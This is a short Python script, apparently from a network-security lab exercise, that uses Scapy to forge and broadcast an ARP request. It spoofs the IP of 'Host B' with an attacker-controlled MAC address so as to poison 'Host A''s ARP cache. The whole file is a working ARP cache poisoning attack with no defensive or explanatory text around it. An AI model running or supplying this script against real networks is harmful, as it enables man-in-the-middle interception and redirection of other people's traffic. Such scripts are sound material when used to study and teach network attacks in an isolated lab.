#!/usr/bin/env python3
from scapy.all import *

E = Ether()
A = ARP()

fake_MAC = "02:42:0a:09:00:69"      # Attacker's MAC
broadcast = "ff:ff:ff:ff:ff:ff"     # Broadcast add.
victim_IP = "10.9.0.6"              # Host B's IP
target_IP = "10.9.0.5"              # Host A's IP

# Set values for Ethernet and ARP Request packets
E.src = fake_MAC
E.dst = broadcast

A.psrc = victim_IP                  # B's IP
A.hwsrc = fake_MAC                  # Attacker's MAC
A.pdst = target_IP                  # A's IP (target)
A.op = 1                            # ARP request

# Combine both the ethernet and arp packets
pkt = E / A

# Send the ARP request packet
sendp(pkt)

